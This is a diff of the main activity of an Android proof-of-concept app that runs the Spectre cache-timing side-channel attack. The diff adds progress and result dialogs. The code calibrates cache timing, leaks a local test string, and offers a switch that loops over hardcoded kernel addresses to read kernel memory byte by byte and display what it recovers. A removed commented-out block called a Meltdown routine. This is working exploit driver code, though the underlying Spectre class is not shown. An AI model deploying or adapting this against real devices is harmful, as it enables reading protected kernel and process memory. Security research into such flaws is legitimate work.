@@ -1,6 +1,9 @@
 package android.spectre;
 
+import android.app.AlertDialog;
+import android.app.ProgressDialog;
 import android.os.Bundle;
+import android.os.Handler;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
 import android.view.View;
@@ -8,6 +11,8 @@ import android.widget.Button;
 import android.widget.CompoundButton;
 import android.widget.LinearLayout;
 import android.widget.Switch;
+import android.widget.TextView;
+import android.widget.Toast;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -18,17 +23,19 @@ import java.util.Scanner;
 public class MainActivity extends AppCompatActivity {
     public static final String TAG = MainActivity.class.getSimpleName();
     public static final Object SPECTRE_MUTEX = new Object();
+    private static final Handler mHandler = new Handler();
+
     public static final Spectre.Callback quietCallback = new Spectre.Callback() {
         @Override
         public void onByte(int offset, long pointer, byte bestGuess, int bestScore, byte secondGuess, int secondScore) {
         }
     };
 
-    void setupCache(boolean log) {
+    void setupCache(Spectre spectre, boolean log) {
         int[] hitTimes  = new int[11];
         int[] missTimes = new int[11];
-        int cacheThreshold = Spectre.calibrateTiming(1024, hitTimes, missTimes);
-        if (!log) {
+        int cacheThreshold = spectre.calibrateTiming(1024, hitTimes, missTimes);
+        if (log) {
             Log.i(TAG, "Cache hit: " + Arrays.toString(hitTimes));
             Log.i(TAG, "Cache miss: " + Arrays.toString(missTimes));
             Log.i(TAG, "Cache threshold: " + cacheThreshold);
@@ -37,62 +44,120 @@ public class MainActivity extends AppCompatActivity {
 
 
     class SpectreCallback implements Spectre.Callback {
-        final byte[] actualValue;
+        final ProgressDialog progressDialog;
+        final int readSize;
+        final byte[] expectedRead;
+        String dataRead = "";
 
-        public SpectreCallback() {
-            this(null);
+        private char charFromByte(byte val) {
+            return val > 31 && val < 127 ? (char) val : '�';
         }
 
-        public SpectreCallback(byte[] actualValue) {
-            this.actualValue = actualValue;
+        public SpectreCallback(ProgressDialog progressDialog, int readSize) {
+            this.progressDialog = progressDialog;
+            this.readSize = readSize;
+            this.expectedRead = null;
+        }
+
+        public SpectreCallback(ProgressDialog progressDialog, byte[] expectedRead) {
+            this.progressDialog = progressDialog;
+            this.readSize = expectedRead.length;
+            this.expectedRead = expectedRead;
         }
 
         @Override
         public void onByte(int offset, long pointer, byte bestGuess, int bestScore, byte secondGuess, int secondScore) {
+            dataRead += charFromByte(bestGuess);
+
             String msg = String.format("ptr=0x%016x, %s, %02x => '%c', score=%d",
                     pointer,
                     bestScore >= 2 * secondScore ? ": Success" : ": Unclear",
                     bestGuess,
-                    bestGuess > 31 && bestGuess < 127 ? (char) bestGuess : '�',
+                    charFromByte(bestGuess),
                     bestScore);
 
             if (secondScore > 0) {
                 msg += String.format("  --  Second guess: %02x => '%c', score=%d",
                         secondGuess,
-                        secondGuess > 31 && secondGuess < 127 ? (char) secondGuess : '�',
+                        charFromByte(secondGuess),
                         secondScore);
             }
 
-            if (actualValue != null) {
-                if (bestGuess != actualValue[offset]) {
+            if (expectedRead != null) {
+                if (bestGuess != expectedRead[offset]) {
                     msg += String.format("  --  Wrong! Should be %02x => '%c'",
-                            actualValue[offset],
-                            actualValue[offset] > 31 && actualValue[offset] < 127 ? (char) actualValue[offset] : '�');
+                            expectedRead[offset],
+                            charFromByte(expectedRead[offset]));
                 } else {
                     msg += " -- Correct";
                 }
             }
             Log.i(TAG, msg);
+            updateProgress(progressDialog, "Reading: '" + dataRead + "'", offset+1, readSize);
+            if (offset == readSize - 1) {
+                mHandler.post(new Runnable() {
+                    @Override
+                    public void run() {
+                        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
+                        builder.setTitle("Data fetch complete");
+
+                        TextView textView = new TextView(MainActivity.this);
+                        textView.setText(dataRead);
+
+                        builder.setView(textView);
+                        builder.create().show();
+                    }
+                });
+            }
         }
     }
 
-    void accessLocalMemory(Spectre.Variant variant, String msg) {
-        setupCache(false);
-        Spectre.read("WARM-UPonjsopdjnfisafjdnaslkdjfnlksadjfnpisdjsijdfsakmfnpdijfn sfhnosjdiuhbfushgfuhofdpjfnda".getBytes(), quietCallback, variant);
-        setupCache(true);
-
-        Log.i(TAG, "Using " + variant.description + " to read '" + msg + "'");
-        final byte[] raw_data = msg.getBytes();
-        Spectre.read(raw_data, new SpectreCallback(raw_data), variant);
+    private void updateProgress(final ProgressDialog progressDialog, final String message, final int progress, final int maxProgress) {
+        mHandler.post(new Runnable() {
+            @Override
+            public void run() {
+                progressDialog.setTitle(message);
+                progressDialog.setIndeterminate(maxProgress == 0);
+                progressDialog.setMax(maxProgress);
+                progressDialog.setProgress(progress);
+            }
+        });
     }
 
-    void accessKernelMemory(Spectre.Variant variant, long ptr, int len) {
-        /*setupCache(false);
-        Spectre.read("WARM-UP".getBytes(), quietCallback, variant);
-        setupCache(true);
-        */
-        Log.i(TAG, "Using " + variant.description + " to read " + len + "bytes at " + String.format("0x%016x", ptr));
-        Spectre.read(ptr, len, new SpectreCallback(), variant);
+    void accessLocalMemory(Spectre spectre, final ProgressDialog progressDialog, final String msg) {
+        try {
+            updateProgress(progressDialog, "Warming up", 0, 0);
+            setupCache(spectre, false);
+            spectre.read("WARM-UP".getBytes(), quietCallback);
+            setupCache(spectre, true);
+
+            updateProgress(progressDialog, "Reading: ''", 0, msg.length());
+
+            Log.i(TAG, "Using " + spectre + " to read '" + msg + "'");
+            final byte[] raw_data = msg.getBytes();
+            spectre.read(raw_data, new SpectreCallback(progressDialog, raw_data));
+        } catch (final Exception e) {
+            e.printStackTrace();
+            mHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    Toast.makeText(MainActivity.this, e.toString(), Toast.LENGTH_LONG).show();
+                }
+            });
+        }
+    }
+
+    void accessKernelMemory(Spectre spectre, final ProgressDialog progressDialog, long ptr, int len) {
+        try {
+            /*setupCache(false);
+            Spectre.read("WARM-UP".getBytes(), quietCallback, variant);
+            setupCache(true);
+            */
+            Log.i(TAG, "Using " + spectre + " to read " + len + "bytes at " + String.format("0x%016x", ptr));
+            spectre.read(ptr, len, new SpectreCallback(progressDialog, len));
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     @Override
@@ -112,12 +177,19 @@ public class MainActivity extends AppCompatActivity {
 
         LinearLayout layout = (LinearLayout) findViewById(R.id.root_layout);
         for (final Spectre.Variant variant : Spectre.Variant.values()) {
+            final Spectre spectre = variant.build();
             Button button = new Button(this);
             button.setText(variant.description);
             layout.addView(button);
 
             button.setOnClickListener(new Button.OnClickListener() {
                 public void onClick(View v) {
+                    final ProgressDialog progressDialog = new ProgressDialog(MainActivity.this);
+                    progressDialog.setTitle("Reading " + (memorySpaceSwitch.isChecked() ? "kernel" : "local") + " memory via " + variant.description);
+                    progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
+                    progressDialog.setCancelable(false);
+                    progressDialog.show();
+
                     Thread t = new Thread() {
                         @Override
                         public void run() {
@@ -125,13 +197,20 @@ public class MainActivity extends AppCompatActivity {
                                 if (memorySpaceSwitch.isChecked()) {
                                     for (int i=0; i<1024; i++) {
                                         if (i % 256 == 0) {
-                                            setupCache(false);
+                                            setupCache(spectre, false);
                                         }
-                                        accessKernelMemory(variant, 0xffffffd140000000L + 157 + 0x1000000*i, 4);
+                                        accessKernelMemory(spectre, progressDialog, 0xffffffd140000000L + 157 + 0x1000000*i, 4);
                                     }
                                 } else {
-                                    accessLocalMemory(variant, "Mary had a little lamb");
+                                    accessLocalMemory(spectre, progressDialog, "Mary had a little lamb");
                                 }
+
+                                mHandler.post(new Runnable() {
+                                    @Override
+                                    public void run() {
+                                        progressDialog.dismiss();
+                                    }
+                                });
                             }
                         }
                     };
@@ -140,20 +219,5 @@ public class MainActivity extends AppCompatActivity {
                 }
             });
         }
-        /*
-        Button btnMeltdown = (Button) findViewById(R.id.btn_meltdown);
-        btnMeltdown.setOnClickListener(new Button.OnClickListener() {
-            public void onClick(View v) {
-                Thread t = new Thread() {
-                    @Override
-                    public void run() {
-                        meltdown(0xffffffc00008f000L, 256);
-                    }
-                };
-                t.setPriority(Thread.MAX_PRIORITY);
-                t.start();
-            }
-        });
-        */
     }
 }
